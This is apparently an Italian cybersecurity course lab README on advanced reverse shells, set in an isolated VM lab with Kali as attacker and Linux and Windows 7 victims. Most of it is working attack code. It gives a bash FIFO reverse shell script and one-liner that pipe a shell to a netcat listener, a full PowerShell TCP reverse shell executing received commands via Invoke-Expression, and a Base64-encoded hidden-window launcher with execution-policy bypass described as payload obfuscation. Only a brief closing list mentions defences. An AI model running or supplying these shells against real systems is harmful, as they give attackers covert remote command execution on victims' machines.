Lab-14 — l'ultimo! Clicca "+" → Create new file, scrivi:
lab-14-reverse-shell/README.md
Incolla questo:
markdown# Lab 14 — Reverse Shell Avanzata

## Obiettivo
Stabilire reverse shell interattive su Linux (bash FIFO named pipe) e Windows (PowerShell nativo) per comprendere i meccanismi di accesso remoto post-exploitation.

## Ambiente
| VM | IP | Ruolo |
|---|---|---|
| Kali Linux | 10.0.2.6 | Attaccante (listener) |
| Lubuntu | 10.0.2.15 | Vittima Linux |
| Windows 7 SP1 | — | Vittima Windows |

## Tool utilizzati
- `netcat` — listener su Kali
- `mkfifo` / `bash` — reverse shell Linux
- `PowerShell` — reverse shell Windows nativo

## Tecnica 1 — Bash FIFO Named Pipe (Linux)

### Script implant.sh
```bash
#!/bin/sh
KALI_IP="10.0.2.6"
KALI_PORT="443"

rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/sh -i 2>&1 | nc "${KALI_IP}" "${KALI_PORT}" > /tmp/f
```

### Flusso dati
Kali (attaccante)          Vittima (Linux)
nc -lvnp 443    <------  nc KALI_IP 443
|                        |
Invia comandi  ------->  /tmp/f (FIFO)
|
/bin/sh -i
|
Riceve output  <------   nc KALI_IP 443

### Esecuzione
```bash
# Su Kali
nc -lvnp 443

# Su vittima Linux
chmod +x implant.sh && ./implant.sh

# One-liner
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.2.6 443 > /tmp/f
```

## Tecnica 2 — PowerShell (Windows)

### Script reverse.ps1
```powershell
$KALI_IP = "10.0.2.6"
$KALI_PORT = 443

try {
    $client = New-Object System.Net.Sockets.TCPClient($KALI_IP, $KALI_PORT)
    $stream = $client.GetStream()
    [byte[]]$bytes = 0..65535 | ForEach-Object { 0 }
    while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {
        $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes, 0, $i)
        $sendback = (Invoke-Expression $data 2>&1 | Out-String)
        $sendback2 = $sendback + "PS " + (Get-Location).Path + "> "
        $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
}
catch { Write-Host "[-] Errore: $($_.Exception.Message)" }
finally { if ($client) { $client.Close() } }
```

### Esecuzione
```bash
# Su Kali
nc -lvnp 443
```
```powershell
# Su vittima Windows
powershell -ExecutionPolicy Bypass -File .\reverse.ps1
```

### One-liner con Base64 encoding
```powershell
$command = '$client=New-Object System.Net.Sockets.TCPClient("10.0.2.6",443);...'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
$encoded = [Convert]::ToBase64String($bytes)
powershell -NoP -NonI -W Hidden -Exec Bypass -EncodedCommand $encoded
```

## Flag PowerShell
| Flag | Significato |
|---|---|
| -NoP | No Profile |
| -NonI | Non-Interactive |
| -W Hidden | Finestra nascosta |
| -Exec Bypass | Bypassa ExecutionPolicy |

## Confronto Linux vs Windows
| Caratteristica | Bash + FIFO | PowerShell |
|---|---|---|
| Dipendenze | netcat, mkfifo | Nessuna (nativo) |
| Bidirezionalità | Via FIFO | Via TCP stream |
| Stealth | Bassa | Alta (-W Hidden) |
| Compatibilità | Linux/Unix/macOS | Windows 7/10/11 |

## Risultati
- Reverse shell bash FIFO funzionante su Lubuntu
- Reverse shell PowerShell funzionante su Windows 7
- Base64 encoding applicato per obfuscation del payload

## Concetti chiave
- La reverse shell bypassa firewall che bloccano connessioni in ingresso
- Base64 encoding non è cifratura — è offuscamento della signature
- Difesa: egress filtering, EDR, PowerShell Constrained Language Mode, logging
